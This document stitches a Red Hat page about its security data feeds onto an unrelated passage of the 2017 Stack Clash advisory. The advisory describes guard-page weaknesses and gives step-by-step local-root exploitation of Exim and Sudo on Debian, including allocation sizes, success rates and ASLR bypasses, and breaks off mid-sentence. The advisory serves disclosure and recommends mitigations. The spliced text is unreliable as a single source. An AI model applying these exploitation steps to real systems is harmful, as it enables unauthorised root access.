* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

  + [Link to CSAF advisories](https://security.access.redhat.com/data/csaf/v2/advisories/)
* [VEX files for CVEs GA announcement post](https://www.redhat.com/en/blog/red-hat-vex-files-cves-are-now-generally-available%20)
  + [Link to CSAF VEX per-CVE files](https://security.access.redhat.com/data/csaf/v2/vex/)

### OSV Records

[Red Hat / OSV.dev announcement on OpenSSF](https://openssf.org/blog/2024/11/01/red-hats-collaboration-with-the-openssf-and-osv-dev-yields-results-red-hat-security-data-now-available-in-the-osv-format/%20). The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

### SBOM Documents

Software Bill of Materials (SBOM) is a complete list of components, their versions, licensing information, provenance, and other metadata for a given product. Red Hat publishes SBOM documents for select products at:

* [Link to SBOM documents](https://security.access.redhat.com/data/sbom/beta/spdx/)

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

* [OVAL compatibility FAQ](https://access.redhat.com/articles/221883)
* [OVAL Streams directory](https://security.access.redhat.com/data/oval/v2/)
* [SCAP source data stream files](https://security.access.redhat.com/data/metrics/ds/v2/)

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

========================================================================
I. Introduction
========================================================================
Our research started with a 96-megabyte surprise:
b97bb000-b97dc000 rw-p 00000000 00:00 0 [heap]
bf7c6000-bf806000 rw-p 00000000 00:00 0 [stack]
and a 12-year-old question: "If the heap grows up, and the stack grows
down, what happens when they clash? Is it exploitable? How?"
- In 2005, Gael Delalleau presented "Large memory management
vulnerabilities" and the first stack-clash exploit in user-space
(against mod\_php 4.3.0 on Apache 2.0.53):
http://cansecwest.com/core05/memory\_vulns\_delalleau.pdf
- In 2010, Rafal Wojtczuk published "Exploiting large memory management
vulnerabilities in Xorg server running on Linux", the second
stack-clash exploit in user-space (CVE-2010-2240):
http://www.invisiblethingslab.com/resources/misc-2010/xorg-large-memory-attacks.pdf
- Since 2010, security researchers have exploited several stack-clashes
in the kernel-space; for example:
https://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/
https://jon.oberheide.org/files/infiltrate12-thestackisback.pdf
https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel\_20.html
In user-space, however, this problem has been greatly underestimated;
the only public exploits are Gael Delalleau's and Rafal Wojtczuk's, and
they were written before Linux introduced a protection against
stack-clashes (a "guard-page" mapped below the stack):
https://bugzilla.redhat.com/show\_bug.cgi?id=CVE-2010-2240
In this advisory, we show that stack-clashes are widespread in
user-space, and exploitable despite the stack guard-page; we discovered
multiple vulnerabilities in guard-page implementations, and devised
general methods for:
- "Clashing" the stack with another memory region: we allocate memory
until the stack reaches another memory region, or until another memory
region reaches the stack;
- "Jumping" over the stack guard-page: we move the stack-pointer from
the stack and into the other memory region, without accessing the
stack guard-page;
- "Smashing" the stack, or the other memory region: we overwrite the
stack with the other memory region, or the other memory region with
the stack.
To illustrate our findings, we developed the following exploits and
proofs-of-concepts:
- a local-root exploit against Exim (CVE-2017-1000369, CVE-2017-1000376)
on i386 Debian;
- a local-root exploit against Sudo (CVE-2017-1000367, CVE-2017-1000366)
on i386 Debian, Ubuntu, CentOS;
- an independent Sudoer-to-root exploit against CVE-2017-1000367 on any
SELinux-enabled distribution;
- a local-root exploit against ld.so and most SUID-root binaries
(CVE-2017-1000366, CVE-2017-1000370) on i386 Debian, Fedora, CentOS;
- a local-root exploit against ld.so and most SUID-root PIEs
(CVE-2017-1000366, CVE-2017-1000371) on i386 Debian, Ubuntu, Fedora;
- a local-root exploit against /bin/su (CVE-2017-1000366,
CVE-2017-1000365) on i386 Debian;
- a proof-of-concept that gains eip control against Sudo on i386
grsecurity/PaX (CVE-2017-1000367, CVE-2017-1000366, CVE-2017-1000377);
- a local proof-of-concept that gains rip control against Exim
(CVE-2017-1000369) on amd64 Debian;
- a local-root exploit against ld.so and most SUID-root binaries
(CVE-2017-1000366, CVE-2017-1000379) on amd64 Debian, Ubuntu, Fedora,
CentOS;
- a proof-of-concept against /usr/bin/at on i386 OpenBSD, for
CVE-2017-1000372 in OpenBSD's stack guard-page implementation and
CVE-2017-1000373 in OpenBSD's qsort() function;
- a proof-of-concept for CVE-2017-1000374 and CVE-2017-1000375 in
NetBSD's stack guard-page implementation;
- a proof-of-concept for CVE-2017-1085 in FreeBSD's setrlimit()
RLIMIT\_STACK implementation;
- two proofs-of-concept for CVE-2017-1083 and CVE-2017-1084 in FreeBSD's
stack guard-page implementation;
- a local-root exploit against /usr/bin/rsh (CVE-2017-3630,
CVE-2017-3629, CVE-2017-3631) on Solaris 11.
========================================================================
II. Problem
========================================================================
Note: in this advisory, the "start of the stack" is the lowest address
of its memory region, and the "end of the stack" is the highest address
of its memory region; we do not use the ambiguous terms "top of the
stack" and "bottom of the stack".
========================================================================
II.1. Automatic stack expansion
========================================================================
The user-space stack of a process is automatically expanded by the
kernel:
- if the stack-pointer (the esp register, on i386) reaches the start of
the stack and the unmapped memory pages below (the stack grows down,
on i386),
- then a "page-fault" exception is raised and caught by the kernel,
- and the page-fault handler transparently expands the user-space stack
of the process (it decreases the start address of the stack),
- or it terminates the process with a SIGSEGV if the stack expansion
fails (for example, if the RLIMIT\_STACK is reached).
Unfortunately, this stack expansion mechanism is implicit and fragile:
it relies on page-fault exceptions, but if another memory region is
mapped directly below the stack, then the stack-pointer can move from
the stack into the other memory region without raising a page-fault,
and:
- the kernel cannot tell that the process needed more stack memory;
- the process cannot tell that its stack-pointer moved from the stack
into another memory region.
In contrast, the heap expansion mechanism is explicit and robust: the
process uses the brk() system-call to tell the kernel that it needs more
heap memory, and the kernel expands the heap accordingly (it increases
the end address of the heap memory region -- the heap always grows up).
========================================================================
II.2. Stack guard-page
========================================================================
The fragile stack expansion mechanism poses a security threat: if the
stack-pointer of a process can move from the stack into another memory
region (which ends exactly where the stack starts) without raising a
page-fault, then:
- the process uses this other memory region as if it were an extension
of the stack;
- a write to this stack extension smashes the other memory region;
- a write to the other memory region smashes the stack extension.
To protect against this security threat, the kernel maps a "guard-page"
below the start of the stack: one or more PROT\_NONE pages (or unmappable
pages) that:
- raise a page-fault exception if accessed (before the stack-pointer can
move from the stack into another memory region);
- terminate the process with a SIGSEGV (because the page-fault handler
cannot expand the stack if another memory region is mapped directly
below).
Unfortunately, a stack guard-page of a few kilobytes is insufficient
(CVE-2017-1000364): if the stack-pointer "jumps" over the guard-page --
if it moves from the stack into another memory region without accessing
the guard-page -- then no page-fault exception is raised and the stack
extends into the other memory region.
This theoretical vulnerability was first described in Gael Delalleau's
2005 presentation (slides 24-29). In the present advisory, we discuss
its practicalities, and multiple vulnerabilities in stack guard-page
implementations (in OpenBSD, NetBSD, and FreeBSD), but we exclude
related vulnerabilities such as unbounded alloca()s and VLAs
(Variable-Length Arrays) that have been exploited in the past:

II.3. Stack-clash exploitation
========================================================================
Must be a clash, there's no alternative.
--The Clash, "Kingston Advice"
Our exploits follow a series of four sequential steps -- each step
allocates memory that must not be freed before all steps are complete:
Step 1: Clash (the stack with another memory region)
Step 2: Run (move the stack-pointer to the start of the stack)
Step 3: Jump (over the stack guard-page, into the other memory region)
Step 4: Smash (the stack, or the other memory region)
========================================================================
II.3.1. Step 1: Clash the stack with another memory region
========================================================================
Have the boys found the leak yet?
--The Clash, "The Leader"
Allocate memory until the start of the stack reaches the end of another
memory region, or until the end of another memory region reaches the
start of the stack.
- The other memory region can be, for example:
. the heap;
. an anonymous mmap();
. the read-write segment of ld.so;
. the read-write segment of a PIE, a Position-Independent Executable.
- The memory allocated in this Step 1 can be, for example:
. stack and heap memory;
. stack and anonymous mmap() memory;
. stack memory only.
- The heap and anonymous mmap() memory can be:
. temporarily allocated, but not freed before the stack guard-page is
jumped over in Step 3 and memory is smashed in Step 4;
. permanently leaked. On Linux, a general method for allocating
anonymous mmap()s is the LD\_AUDIT memory leak that we discovered in
the ld.so part of the glibc, the GNU C Library (CVE-2017-1000366).
- The stack memory can be allocated, for example:
. through megabytes of command-line arguments and environment
variables.
On Linux, this general method for allocating stack memory is limited
by the kernel to 1/4 of the current RLIMIT\_STACK (1GB on i386 if
RLIMIT\_STACK is RLIM\_INFINITY -- man execve, "Limits on size of
arguments and environment").
However, as we were drafting this advisory, we realized that the
kernel imposes this limit on the argument and environment strings,
but not on the argv[] and envp[] pointers to these strings, and we
developed alternative versions of our Linux exploits that do not
depend on application-specific memory leaks (CVE-2017-1000365).
. through recursive function calls.
On BSD, we discovered a general method for allocating megabytes of
stack memory: a vulnerability in qsort() that causes this function
to recurse N/4 times, given a pathological input array of N elements
(CVE-2017-1000373 in OpenBSD, CVE-2017-1000378 in NetBSD, and
CVE-2017-1082 in FreeBSD).
- In a few rare cases, Step 1 is not needed, because another memory
region is naturally mapped directly below the stack (for example,
ld.so in our Solaris exploit).
========================================================================
II.3.2. Step 2: Move the stack-pointer to the start of the stack
========================================================================
Run, run, run, run, run, don't you know?
--The Clash, "Three Card Trick"
Consume the unused stack memory that separates the stack-pointer from
the start of the stack. This Step 2 is similar to Step 3 ("Jump over the
stack guard-page") but is needed because:
- the stack-pointer is usually several kilobytes higher than the start
of the stack (functions that allocate a large stack-frame decrease the
start address of the stack, but this address is never increased
again); moreover:
. the FreeBSD kernel automatically expands the user-space stack of a
process by multiples of 128KB (SGROWSIZ, in vm\_map\_growstack());
. the Linux kernel initially expands the user-space stack of a process
by 128KB (stack\_expand, in setup\_arg\_pages()).
- in Step 3, the stack-based buffer used to jump over the guard-page:
. is usually not large enough to simultaneously move the stack-pointer
to the start of the stack, and then into another memory region;
. must not be fully written to (a full write would access the stack
guard-page and terminate the process) but the stack memory consumed
in this Step 2 can be fully written to (for example, strdupa() can
be used in Step 2, but not in Step 3).
The stack memory consumed in this Step 2 can be, for example:
- large stack-frames, alloca()s, or VLAs (which can be detected by
grsecurity/PaX's STACKLEAK plugin for GCC,
https://grsecurity.net/features.php);
- recursive function calls (which can be detected by GNU cflow,
http://www.gnu.org/software/cflow/);
- on Linux, we discovered that the argv[] and envp[] arrays of pointers
can be used to consume the 128KB of initial stack expansion, because
the kernel allocates these arrays on the stack long after the call to
setup\_arg\_pages(); this general method for completing Step 2 is
exploitable locally, but the initial stack expansion poses a major
obstacle to the remote exploitation of stack-clashes, as mentioned in
IV.1.1.
In a few rare cases, Step 2 is not needed, because the stack-pointer is
naturally close to the start of the stack (for example, in Exim's main()
function, the 256KB group\_list[] moves the stack-pointer to the start of
the stack and beyond).
========================================================================
II.3.3. Step 3: Jump over the stack guard-page, into another memory
region
========================================================================
You need a little jump of electrical shockers.
--The Clash, "Clash City Rockers"
Move the stack-pointer from the stack and into the memory region that
clashed with the stack in Step 1, but without accessing the guard-page.
To complete this Step 3, a large stack-based buffer, alloca(), or VLA is
needed, and:
- it must be larger than the guard-page;
- it must end in the stack, above the guard-page;
- it must start in the memory region below the stack guard-page;
- it must not be fully written to (a full write would access the
guard-page, raise a page-fault exception, and terminate the process,
because the memory region mapped directly below the stack prevents the
page-fault handler from expanding the stack).
In a few cases, Step 3 is not needed:
- on FreeBSD, a stack guard-page is implemented but disabled by default
(CVE-2017-1083);
- on OpenBSD, NetBSD, and FreeBSD, we discovered implementation
vulnerabilities that eliminate the stack guard-page (CVE-2017-1000372,
CVE-2017-1000374, CVE-2017-1084).
On Linux, we devised general methods for jumping over the stack
guard-page (CVE-2017-1000366):
- The glibc's \_\_dcigettext() function alloca()tes single\_locale, a
stack-based buffer of up to 128KB (MAX\_ARG\_STRLEN, man execve), the
length of the LANGUAGE environment variable (if the current locale is
neither "C" nor "POSIX", but distributions install default locales
such as "C.UTF-8" and "en\_US.utf8").
If LANGUAGE is mostly composed of ':' characters, then single\_locale
is barely written to, and can be used to jump over the stack
guard-page.
Moreover, if \_\_dcigettext() finds the message to be translated, then
\_nl\_find\_msg() strdup()licates the OUTPUT\_CHARSET environment variable
and allows a local attacker to immediately smash the stack and gain
control of the instruction pointer (the eip register, on i386), as
detailed in Step 4a.
We exploited this stack-clash against Sudo and su, but most of the
SUID (set-user-ID) and SGID (set-group-ID) binaries that call
setlocale(LC\_ALL, "") and \_\_dcigettext() or its derivatives (the
\*gettext() functions, the \_() convenience macro, the strerror()
function) are exploitable.
- The glibc's vfprintf() function (called by the \*printf() family of
functions) alloca()tes a stack-based work buffer of up to 64KB
(\_\_MAX\_ALLOCA\_CUTOFF) if a width or precision is greater than 1KB
(WORK\_BUFFER\_SIZE).
If the corresponding format specifier is %s then this work buffer is
never written to and can be used to jump over the stack guard-page.
None of our exploits is based on this method, but it was one of our
ideas to exploit Exim remotely, as mentioned in IV.1.1.
- The glibc's getaddrinfo() function calls gaih\_inet(), which
alloca()tes tmpbuf, a stack-based buffer of up to 64KB
(\_\_MAX\_ALLOCA\_CUTOFF) that may be used to jump over the stack
guard-page.
Moreover, gaih\_inet() calls the gethostbyname\*() functions, which
malloc()ate a heap-based DNS response of up to 64KB (MAXPACKET) that
may allow a remote attacker to immediately smash the stack, as
detailed in Step 4a.
None of our exploits is based on this method, but it may be the key to
the remote exploitation of stack-clashes.
- The glibc's run-time dynamic linker ld.so alloca()tes llp\_tmp, a
stack-based copy of the LD\_LIBRARY\_PATH environment variable. If
LD\_LIBRARY\_PATH contains Dynamic String Tokens (DSTs), they are first
expanded: llp\_tmp can be larger than 128KB (MAX\_ARG\_STRLEN) and not
fully written to, and can therefore be used to jump over the stack
guard-page and smash the memory region mapped directly below, as
detailed in Step 4b.
We exploited this ld.so stack-clash in two data-only attacks that
bypass NX (No-eXecute) and ASLR (Address Space Layout Randomization)
and obtain a privileged shell through most SUID and SGID binaries on
most i386 Linux distributions.
- Several local and remote applications allocate a 256KB stack-based
"gid\_t buffer[NGROUPS\_MAX];" that is not fully written to and can be
used to move the stack-pointer to the start of the stack (Step 2) and
jump over the guard-page (Step 3). For example, Exim's main() function
and older versions of util-linux's su.
None of our exploits is based on this method, but an experimental
version of our Exim exploit unexpectedly gained control of eip after
the group\_list[] buffer had jumped over the stack guard-page.
========================================================================
II.3.4. Step 4: Either smash the stack with another memory region (Step
4a) or smash another memory region with the stack (Step 4b)
========================================================================
Smash and grab, it's that kind of world.
--The Clash, "One Emotion"
In Step 3, a function allocates a large stack-based buffer and jumps
over the stack guard-page into the memory region mapped directly below;
in Step 4, before this function returns and jumps back into the stack:
- Step 4a: a write to the memory region mapped below the stack (where
esp still points to) effectively smashes the stack. We exploit this
general method for completing Step 4 in Exim, Sudo, and su:
. we overwrite a return-address on the stack and gain control of eip;
. we return-into-libc (into system() or \_\_libc\_dlopen()) to defeat NX;
. we brute-force ASLR (8 bits of entropy) if CVE-2016-3672 is patched;
. we bypass SSP (Stack-Smashing Protector) because we overwrite the
return-address of a function that is not protected by a stack canary
(the memcpy() that smashes the stack usually overwrites its own
stack-frame and return-address).
- Step 4b: a write to the stack effectively smashes the memory region
mapped below (where esp still points to). This second method for
completing Step 4 is application-specific (it depends on the contents
of the memory region that we smash) unless we exploit the run-time
dynamic linker ld.so:
. on Solaris, we devised a general method for smashing ld.so's
read-write segment, overwriting one of its function pointers, and
executing our own shell-code;
. on Linux, we exploited most SUID and SGID binaries through ld.so:
our "hwcap" exploit smashes an mmap()ed string, and our ".dynamic"
exploit smashes a PIE's read-write segment before it is mprotect()ed
read-only by Full RELRO (Full RELocate Read-Only -- GNU\_RELRO and
BIND\_NOW).
========================================================================
III. Solutions
========================================================================
Based on our research, we recommend that the affected operating systems:
- Increase the size of the stack guard-page to at least 1MB, and allow
system administrators to easily modify this value (for example,
grsecurity/PaX introduced /proc/sys/vm/heap\_stack\_gap in 2010).
This first, short-term solution is cheap, but it can be defeated by a
very large stack-based buffer.
- Recompile all userland code (ld.so, libraries, binaries) with GCC's
"-fstack-check" option, which prevents the stack-pointer from moving
into another memory region without accessing the stack guard-page (it
writes one word to every 4KB page allocated on the stack).
This second, long-term solution is expensive, but it cannot be
defeated (even if the stack guard-page is only 4KB, one page) --
unless a vulnerability is discovered in the implementation of the
stack guard-page or the "-fstack-check" option.

IV. Results
========================================================================
========================================================================
IV.1. Linux
========================================================================
========================================================================
IV.1.1. Exim
========================================================================
Debian 8.5
Crude exploitation
Our first exploit, a Local Privilege Escalation against Exim's SUID-root
PIE (Position-Independent Executable) on i386 Debian 8.5, simply follows
the four sequential steps outlined in II.3.
Step 1: Clash the stack with the heap
To reach the start of the stack with the end of the heap (man brk), we
permanently leak memory through multiple -p command-line arguments that
are malloc()ated by Exim but never free()d (CVE-2017-1000369) -- we call
such a malloc()ated chunk of heap memory a "memleak-chunk".
Because the -p argument strings are originally allocated on the stack by
execve(), we must cover half of the initial heap-stack distance (between
the start of the heap and the end of the stack) with stack memory, and
half of this distance with heap memory.
If we set the RLIMIT\_STACK to 136MB (MIN\_GAP, arch/x86/mm/mmap.c) then
the initial heap-stack distance is minimal (randomized in a [96MB,137MB]
range), but we cannot reach the stack with the heap because of the 1/4
limit imposed by the kernel on the argument and environment strings (man
execve): 136MB/4=34MB of -p argument strings cannot cover 96MB/2=48MB,
half of the minimum heap-stack distance.
Moreover, if we increase the RLIMIT\_STACK, the initial heap-stack
distance also increases and we still cannot reach the stack with the
heap. However, if we set the RLIMIT\_STACK to RLIM\_INFINITY (4GB on i386)
then the kernel switches from the default top-down mmap() layout to a
legacy bottom-up mmap() layout, and:
- the initial heap-stack distance is approximately 2GB, because the
start of the heap (the initial brk()) is randomized above the address
0x40000000, and the end of the stack is randomized below the address
0xC0000000;
- we can reach the stack with the heap, despite the 1/4 limit imposed by
the kernel on the argument and environment strings, because 4GB/4=1GB
of -p argument strings can cover 2GB/2=1GB, half of the initial
heap-stack distance;
- we clash the stack with the heap around the address 0x80000000.
Step 2: Move the stack-pointer (esp) to the start of the stack
The 256KB stack-based group\_list[] in Exim's main() naturally consumes
the 128KB of initial stack expansion, as mentioned in II.3.2.
Step 3: Jump over the stack guard-page and into the heap
To move esp from the start of the stack into the heap, without accessing
the stack guard-page, we use a malformed -d command-line argument that
is written to the 32KB (STRING\_SPRINTF\_BUFFER\_SIZE) stack-based buffer
in Exim's string\_sprintf() function. This buffer is not fully written to
and hence does not access the stack guard-page, because our -d argument
string is much shorter than 32KB.
Step 4a: Smash the stack with the heap
Before string\_sprintf() returns (and moves esp from the heap back into
the stack) it calls string\_copy(), which malloc()ates and memcpy()es our
-d argument string to the end of the heap, where esp still points to --
we call this malloc()ated chunk of heap memory the "smashing-chunk".
This call to memcpy() therefore smashes its own stack-frame (which is
not protected by SSP) with the contents of our smashing-chunk, and we
overwrite memcpy()'s return-address with the address of libc's system()
function (which is not randomized by ASLR because Debian 8.5 is
vulnerable to CVE-2016-3672):
- instead of smashing memcpy()'s stack-frame with an 8-byte pattern (the
return-address to system() and its argument) we smash it with a simple
4-byte pattern (the return-address to system()), append "." to the
PATH environment variable, and symlink() our exploit to the string
that begins at the address of libc's system() function;
- system() does not drop our escalated root privileges, because Debian's
/bin/sh is dash, not bash and its -p option (man bash).
This first version of our Exim exploit obtained a root-shell after
nearly a week of failed attempts; to improve this result, we analyzed
every step of a successful run.
Refined exploitation
Step 1: Clash the stack with the heap
+ The heap must be able to reach the stack [Condition 1]
The start of the heap is randomized in the 32MB range above the end of
Exim's PIE (the end of its .bss section), but the growth of the heap is
sometimes blocked by libraries that are mmap()ed within the same range
(because of the legacy bottom-up mmap() layout). On Debian 8.5, Exim's
libraries occupy about 8MB and thus block the growth of the heap with a
probability of 8MB/32MB = 1/4.
When the heap is blocked by the libraries, malloc() switches from brk()
to mmap()s of 1MB (MMAP\_AS\_MORECORE\_SIZE), and our memory leak reaches
the stack with mmap()s instead of the heap. Such a stack-clash is also
exploitable, but its probability of success is low, as detailed in
IV.1.6., and we therefore discarded this approach.
+ The heap must always reach the stack, when not blocked by libraries
Because the initial heap-stack distance (between the start of the heap
and the end of the stack) is a random variable:
- either we allocate the exact amount of heap memory to cover the mean
heap-stack distance, but the probability of success of this approach
is low and we therefore discarded it;
- or we allocate enough heap memory to always reach the stack, even when
the initial heap-stack distance is maximal; after the heap reaches the
stack, our memory leak allocates mmap()s of 1MB above the stack (below
0xC0000000) and below the heap (above the libraries), but it must not
exhaust the address-space (the 1GB below 0x40000000 is unmappable);
- the final heap-stack distance (between the end of the heap and the
start of the stack) is also a random variable:
. its minimum value is 8KB (the stack guard-page, plus a safety page
imposed by the brk() system-call in mm/mmap.c);
. its maximum value is roughly the size of a memleak-chunk, plus 128KB
(DEFAULT\_TOP\_PAD, malloc/malloc.c).
Step 3: Jump over the stack guard-page and into the heap
- The stack-pointer must jump over the guard-page and land into the free
chunk at the end of the heap (the remainder of the heap after malloc()
switches from brk() to mmap()), where both the smashing-chunk and
memcpy()'s stack-frame are allocated and overwritten in Step 4a
[Condition 2];
- The write (of approximately smashing-chunk bytes) to
string\_sprintf()'s stack-based buffer (which starts where the
guard-page jump lands) must not crash into the end of the heap
[Condition 3].
Step 4a: Smash the stack with the heap
The smashing-chunk must be allocated into the free chunk at the end of
the heap:
- the smashing-chunk must not be allocated into the free chunks left
over at the end of the 1MB mmap()s [Condition 4];
- the memleak-chunks must not be allocated into the free chunk at the
end of the heap [Condition 5].
Intuitively, the probability of gaining control of eip depends on the
size of the smashing-chunk (the guard-page jump's landing-zone) and the
size of the memleak-chunks (which determines the final heap-stack
distance).
To maximize this probability, we wrote a helper program that imposes the
following conditions on the smashing-chunk and memleak-chunks:
- the smashing-chunk must be smaller than 32KB
(STRING\_SPRINTF\_BUFFER\_SIZE) [Condition 3];
- the memleak-chunks must be smaller than 128KB (DEFAULT\_MMAP\_THRESHOLD,
malloc/malloc.c);
- the free chunk at the end of the heap must be larger than twice the
smashing-chunk size [Conditions 2 and 3];
- the free chunk at the end of the heap must be smaller than the
memleak-chunk size [Condition 5];
- when the final heap-stack distance is minimal, the 32KB
(STRING\_SPRINTF\_BUFFER\_SIZE) guard-page jump must land below the free
chunk at the end of the heap [Condition 2];
- the free chunks at the end of the 1MB mmap()s must be:
. either smaller than the smashing-chunk [Condition 4];
. or larger than the free chunk at the end of the heap (glibc's
malloc() is a best-fit allocator) [Condition 4].
The resulting smashing-chunk and memleak-chunk sizes are:
smash: 10224 memleak: 27656 brk\_min: 20464 brk\_max: 24552 mmap\_top: 25304
probability: 1/16 (0.06190487817)
In theory, the probability of gaining control of eip is 1/21: the
product of the 1/16 probability calculated by this helper program
(approximately (smashing-chunk / (memleak-chunk + DEFAULT\_TOP\_PAD))) and
the 3/4 probability of reaching the stack with the heap [Condition 1].
In practice, on Debian 8.5, our final Exim exploit:
- gains eip control in 1 run out of 28, on average;
- takes 2.5 seconds per run (on a 4GB Virtual Machine);
- has a good chance of obtaining a root-shell after 28\*2.5 = 70 seconds;
- uses 4GB of memory (2GB in the Exim process, and 2GB in the process
fork()ed by system()).
Debian 8.6
Unlike Debian 8.5, Debian 8.6 is not vulnerable to CVE-2016-3672: after
gaining eip control in Step 4a (Smash), the probability of successfully
returning-into-libc's system() function is 1/256 (8 bits of entropy --
libraries are randomized in a 1MB range but aligned on 4KB).
Consequently, our final Exim exploit has a good chance of obtaining a
root-shell on Debian 8.6 after 256\*28\*2.5 seconds = 5 hours (256\*28=7168
runs).
As we were drafting this advisory, we tried an alternative approach
against Exim on Debian 8.6: we discovered that its stack is executable,
because it depends on libgnutls-deb0, which depends on libp11-kit, which
depends on libffi, which incorrectly requires an executable GNU\_STACK
(CVE-2017-1000376).
Initially, we discarded this approach because our 1GB of -p argument
strings on the stack is not executable (\_dl\_make\_stack\_executable() only
mprotect()s the stack below argv[] and envp[]):
41e00000-723d7000 rw-p 00000000 00:00 0 [heap]
802f1000-80334000 rwxp 00000000 00:00 0 [stack]
80334000-bfce6000 rw-p 00000000 00:00 0
and because the stack is randomized in an 8MB range but we do not
control the contents of any large buffer on the executable stack.
Later, we discovered that two 128KB (MAX\_ARG\_STRLEN) copies of the
LD\_PRELOAD environment variable can be allocated onto the executable
stack by ld.so's dl\_main() and open\_path() functions, automatically
freed upon return from these functions, and re-allocated (but not
overwritten) by Exim's 256KB stack-based group\_list[].
In theory, the probability of returning into our shell-code (into these
executable copies of LD\_PRELOAD) is 1/32 (2\*128KB/8MB), higher than the
1/256 probability of returning-into-libc. In practice, this alternative
Exim exploit has a good chance of obtaining a root-shell after 1174 runs
-- instead of 32\*28=896 runs in theory, because the two 128KB copies of
LD\_PRELOAD are never perfectly aligned with Exim's 256KB group\_list[] --
or 1174\*2.5 seconds = 50 minutes.
Debian 9 and 10
Unlike Debian 8, Debian 9 and 10 are not vulnerable to offset2lib, a
minor weakness in Linux's ASLR that coincidentally affects Step 1
(Clash) of our stack-clash exploits:
https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d1fd836dcf00d2028c700c7e44d2c23404062c90
If we set RLIMIT\_STACK to RLIM\_INFINITY, the kernel still switches to
the legacy bottom-up mmap() layout, and the libraries are randomized in
the 1MB range above the address 0x40000000, but Exim's PIE is randomized
in the 1MB range above the address 0x80000000 and the heap is randomized
in the 32MB range above the PIE's .bss section. As a result:
- the heap is always able to reach the stack, because its growth is
never blocked by the libraries -- the theoretical probability of
gaining eip control is 1/16, the probability calculated by our helper
program;
- the heap clashes with the stack around the address 0xA0000000, because
the initial heap-stack distance is 1GB (0xC0000000-0x80000000) and can
be covered with 512MB of heap memory and 512MB of stack memory.
Remote exploitation
Exim's string\_sprintf() or glibc's vfprintf() can be used to remotely
complete Steps 3 and 4 of the stack-clash; and the 256KB group\_list[] in
Exim's main() naturally consumes the 128KB of initial stack expansion in
Step 2; but another 256KB group\_list[] in Exim's exim\_setugid() further
decreases the start address of the stack and prevents us from remotely
completing Step 2 and exploiting Exim.
========================================================================
IV.1.2. Sudo
========================================================================
Introduction
We discovered a vulnerability in Sudo's get\_process\_ttyname() for Linux:
this function opens "/proc/[pid]/stat" (man proc) and reads the device
number of the tty from field 7 (tty\_nr). Unfortunately, these fields are
space-separated and field 2 (comm, the filename of the command) can
contain spaces (CVE-2017-1000367).
For example, if we execute Sudo through the symlink "./ 1 ",
get\_process\_ttyname() calls sudo\_ttyname\_dev() to search for the
non-existent tty device number "1" in the built-in search\_devs[].
Next, sudo\_ttyname\_dev() calls the recursive function
sudo\_ttyname\_scan() to search for this non-existent tty device number
"1" in a breadth-first traversal of "/dev".
Last, we exploit this recursive function during its traversal of the
world-writable "/dev/shm", and allocate hundreds of megabytes of heap
memory from the filesystem (directory pathnames) instead of the stack
(the command-line arguments and environment variables allocated by our
other stack-clash exploits).
Step 1: Clash the stack with the heap
sudo\_ttyname\_scan() strdup()licates the pathnames of the directories and
sub-directories that it traverses, but does not free() them until it
returns. Each one of these "memleak-chunks" allocates at most 4KB
(PATH\_MAX) of heap memory.
Step 2: Move the stack-pointer to the start of the stack
The recursive calls to sudo\_ttyname\_scan() allocate 4KB (PATH\_MAX)
stack-frames that naturally consume the 128KB of initial stack
expansion.
Step 3: Jump over the stack guard-page and into the heap
If the length of a directory pathname reaches 4KB (PATH\_MAX),
sudo\_ttyname\_scan() calls warning(), which calls strerror() and \_(),
which call gettext() and allow us to jump over the stack guard-page with
an alloca() of up to 128KB (the LANGUAGE environment variable), as
explained in II.3.3.
Step 4a: Smash the stack with the heap
The self-contained gettext() exploitation method malloc()ates and
memcpy()es a "smashing-chunk" of up to 128KB (the OUTPUT\_CHARSET
environment variable) that smashes memcpy()'s stack-frame and
return-address, as explained in II.3.4.
Debian 8.5
Step 1: Clash the stack with the heap
Debian 8.5 is vulnerable to CVE-2016-3672: if we set RLIMIT\_STACK to
RLIM\_INFINITY, the kernel switches to the legacy bottom-up mmap() layout
and disables the ASLR of Sudo's PIE and libraries, but still the initial
